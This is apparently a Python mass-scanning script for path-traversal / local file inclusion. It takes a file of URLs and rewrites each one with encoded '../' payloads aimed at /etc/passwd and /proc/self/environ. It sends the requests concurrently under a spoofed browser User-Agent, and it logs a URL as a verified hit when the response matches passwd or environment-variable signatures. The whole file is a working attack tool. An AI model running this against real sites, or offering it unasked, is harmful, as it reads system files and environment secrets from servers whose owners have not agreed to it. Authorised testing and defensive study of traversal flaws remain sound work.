import asyncio
import aiohttp
import re
import sys

INPUT_FILE = sys.argv[1]

# Payload targets (no traversal prefix here)
LFI_TARGETS = [
    "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron"
    # payload for Windows OS removed, avoiding 3x-ing my file checklist
    # "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fhosts",
]


# Output logs
LOG_VERIFIED = "lfi_verified_2.txt"
LOG_POTENTIAL = "lfi_potential_2.txt"

# Basic fingerprints
PATTERNS = [
    r"root:x:0:0:",                         # passwd
    r"PATH=/"                               # environ
    #r"127\.0\.0\.1[ \t]+localhost",        # windows hosts
]

SEM = asyncio.Semaphore(10)  # limit concurrency


def mutate_path(url: str):
    """Replace last path segment with traversal + target."""
    if "?" in url:
        path, query = url.split("?", 1)
        query = "?" + query
    else:
        path, query = url, ""

    parts = path.rstrip("/").split("/")
    if not parts:
        return []

    results = []

    for trav in LFI_TARGETS:
        modified = "/".join(parts[:-1] + [trav])
        results.append(modified + query)

    return results


async def fetch(session, url):
    headers = {
        "User-Agent": (
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        )
    }

    try:
        async with SEM:
            async with session.get(url, timeout=8, headers=headers) as r:
                text = await r.text(errors="ignore")
                return r.status, text

    except Exception:
        return None, None


def check_verified(body: str) -> bool:
    for p in PATTERNS:
        if re.search(p, body):
            return True
    return False


async def worker(session, url):
    mutated_urls = mutate_path(url)

    for murl in mutated_urls:
        status, body = await fetch(session, murl)
        if status is None:
            continue

        # If status OK-ish → mark potential
        if status in (200, 204):
            with open(LOG_POTENTIAL, "a") as f:
                f.write(murl + "\n")

        # Verified by content
        if body and check_verified(body):
            with open(LOG_VERIFIED, "a") as f:
                f.write(murl + "\n")


async def main():
    with open(INPUT_FILE) as f:
        urls = [x.strip() for x in f if x.strip()]

    async with aiohttp.ClientSession() as session:
        tasks = [worker(session, u) for u in urls]
        await asyncio.gather(*tasks)


if __name__ == "__main__":
    asyncio.run(main())
